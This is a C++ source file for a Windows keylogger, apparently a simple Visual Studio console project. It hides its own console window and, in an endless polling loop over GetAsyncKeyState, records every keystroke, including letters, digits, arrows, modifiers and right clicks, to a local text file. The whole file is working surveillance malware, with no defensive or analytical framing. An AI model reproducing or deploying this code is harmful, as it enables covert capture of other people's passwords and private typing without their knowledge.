// keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("loged_data.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" ");
		return true;
	case VK_RETURN:
		LOG("\n");
		return true;
	case '¾':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		LOG("#CAPS_LCOK#");
		return true;
	case VK_TAB:
		
		LOG("#TAB#");
		return true;
	case VK_UP:
		LOG("#UP_ARROW_KEY#");
		return true;
	case VK_DOWN:
		LOG("#DOWN_ARROW_KEY#");
		return true;
	case VK_LEFT:
		LOG("#LEFT_ARROW_KEY#");
		return true;
	case VK_RIGHT:
		LOG("#RIGHT_ARROW_KEY#");
		return true;
	case VK_CONTROL:
		LOG("#CONTROL#");
		return true;
	case VK_MENU:
		LOG("#ALT#");
		return true;
	case 0x41:
		
		LOG("a");
		return true;
	case 0x42:
		
		LOG("b");
		return true;
	case 0x43:
		
		LOG("c");
		return true;
	case 0x44:
		
		LOG("d");
		return true;
	case 0x45:
		LOG("e");
		return true;
	case 0x46:
		LOG("f");
		return true;
	case 0x47:
		LOG("g");
		return true;
	case 0x48:
		LOG("h");
		return true;
	case 0x49:
		LOG("i");
		return true;
	case 0x4A:
		LOG("j");
		return true;
	case 0x4B:
		LOG("k");
		return true;
	case 0x4C:
		LOG("l");
		return true;
	case 0x4D:
		LOG("m");
		return true;
	case 0x4E:
		LOG("n");
		return true;
	case 0x4F:
		LOG("o");
		return true;
	case 0x50:
		LOG("p");
		return true;
	case 0x51:
		LOG("q");
		return true;
	case 0x52:
		LOG("r");
		return true;
	case 0x53:
		LOG("s");
		return true;
	case 0x54:
		LOG("t");
		return true;
	case 0x55:
		LOG("u");
		return true;
	case 0x56:
		LOG("v");
		return true;
	case 0x57:
		LOG("w");
		return true;
	case 0x58:
		LOG("x");
		return true;
	case 0x59:
		LOG("y");
		return true;
	case 0x5A:
		LOG("z");
		return true;
	case 0x30:
		LOG("0");
		return true;
	case 0x31:
		LOG("1");
		return true;
	case 0x32:
		LOG("2");
		return true;
	case 0x33:
		LOG("3");
		return true;
	case 0x34:
		LOG("4");
		return true;
	case 0x35:
		LOG("5");
		return true;
	case 0x36:
		LOG("6");
		return true;
	case 0x37:
		LOG("7");
		return true;
	case 0x38:
		LOG("8");
		return true;
	case 0x39:
		LOG("9");
		return true;
	default:
		return false;
	}
}
#include <iostream>

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("loged_data.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
